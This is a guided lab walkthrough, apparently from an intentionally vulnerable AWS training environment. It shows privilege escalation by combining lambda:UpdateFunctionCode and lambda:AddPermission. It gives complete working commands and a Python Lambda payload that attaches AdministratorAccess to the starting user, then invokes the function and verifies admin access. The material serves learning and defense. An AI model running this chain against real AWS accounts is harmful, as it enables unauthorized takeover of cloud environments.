# Guided Walkthrough: Privilege Escalation via lambda:UpdateFunctionCode + lambda:AddPermission

This scenario demonstrates a sophisticated privilege escalation attack that combines two Lambda permissions: `lambda:UpdateFunctionCode` to modify function code and `lambda:AddPermission` to grant invocation access. This combination allows an attacker to compromise existing Lambda functions, bypass resource-based access restrictions, and execute arbitrary code under the function's privileged execution role.

Unlike simpler Lambda-based escalations, this scenario requires the attacker to overcome an additional security barrier: the Lambda function may have a restrictive resource-based policy that doesn't initially allow the attacker to invoke it. By using `lambda:AddPermission`, the attacker can add themselves to the function's resource policy, granting invocation rights and completing the privilege escalation chain.

This attack is particularly dangerous in environments where Lambda functions are deployed with administrative roles and code update permissions are granted broadly for deployment automation. The addition of `lambda:AddPermission` makes this escalation path more resilient to resource-based policy protections that organizations might implement as a defense-in-depth measure.

## The Challenge

You start as `pl-prod-lambda-005-to-admin-starting-user` with credentials provided by the Terraform deployment. Your permissions are narrow: you can update code on one specific Lambda function, modify its resource-based policy, and invoke it. You cannot list IAM users, attach policies to yourself, or perform any administrative actions directly.

Your goal is to reach full administrative access by abusing the combination of those three Lambda permissions against `pl-prod-lambda-005-to-admin-target-lambda`, whose execution role (`pl-prod-lambda-005-to-admin-lambda-exec-role`) carries `AdministratorAccess`.

## Reconnaissance

First, let's figure out what we're working with. Confirm your identity and verify you lack admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- good, we don't have admin yet
```

Now inspect the target Lambda to understand its execution role and handler configuration:

```bash
aws lambda get-function \
  --function-name pl-prod-lambda-005-to-admin-target-lambda \
  --query '{Handler:Configuration.Handler,Role:Configuration.Role}'
```

This tells you two critical things: the handler name (you must match it in your malicious payload) and the execution role ARN (which has `AdministratorAccess`). You can also check whether an existing resource-based policy blocks invocation:

```bash
aws lambda get-policy \
  --function-name pl-prod-lambda-005-to-admin-target-lambda
# NoSuchResource or a policy that doesn't allow your user -- either way, AddPermission is the fix
```

## Exploitation

### Step 1: Craft the malicious payload

Create a Python file whose name matches the function handler (`lambda_function.lambda_handler` → file must be `lambda_function.py`). The payload uses the execution role's identity to attach `AdministratorAccess` to your starting user:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='pl-prod-lambda-005-to-admin-starting-user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {
        'statusCode': 200,
        'body': json.dumps({'message': 'AdministratorAccess attached'})
    }
EOF

cd /tmp && zip lambda_function.zip lambda_function.py
```

### Step 2: Replace the function code

```bash
aws lambda update-function-code \
  --function-name pl-prod-lambda-005-to-admin-target-lambda \
  --zip-file fileb:///tmp/lambda_function.zip
```

The function now contains your malicious code. But you still can't invoke it if the resource policy blocks you.

### Step 3: Grant yourself invocation rights

```bash
aws lambda add-permission \
  --function-name pl-prod-lambda-005-to-admin-target-lambda \
  --statement-id allow-self-invoke \
  --action lambda:InvokeFunction \
  --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-admin-starting-user
```

This adds a resource-based policy statement that explicitly allows your user to invoke the function. Lambda evaluates both identity-based policies and resource-based policies -- adding this statement satisfies the resource-policy check even if the identity policy already permits it.

### Step 4: Invoke the function

Wait ~15 seconds for the code update to propagate, then pull the trigger:

```bash
aws lambda invoke \
  --function-name pl-prod-lambda-005-to-admin-target-lambda \
  --payload '{}' \
  /tmp/response.json

cat /tmp/response.json
# {"statusCode": 200, "body": "{\"message\": \"AdministratorAccess attached\"}"}
```

The function executed under `pl-prod-lambda-005-to-admin-lambda-exec-role`, which has `AdministratorAccess`. The `iam:AttachUserPolicy` call succeeded because the execution role is allowed to do it.

## Verification

Wait another ~15 seconds for the IAM policy attachment to propagate, then confirm your new powers:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-lambda-005-to-admin-starting-user
# AdministratorAccess should appear in the list

aws iam list-users --max-items 3
# Now succeeds -- you have admin access
```

## What Happened

You started with three Lambda permissions and turned them into full administrative access without ever touching an IAM API directly. The key insight is that `lambda:UpdateFunctionCode` lets you control *what code runs*, and `lambda:AddPermission` lets you control *who can trigger it*. Because the function's execution role already had `AdministratorAccess`, you could use it as a code execution primitive to make any IAM change you wanted.

In real environments this attack surface appears wherever deployment pipelines or CI/CD systems are granted broad Lambda update permissions. The `lambda:AddPermission` piece makes this variant more resilient than a plain `UpdateFunctionCode` attack: even if an organization restricts invocation via resource policies, an attacker with `AddPermission` can simply grant themselves the missing right.
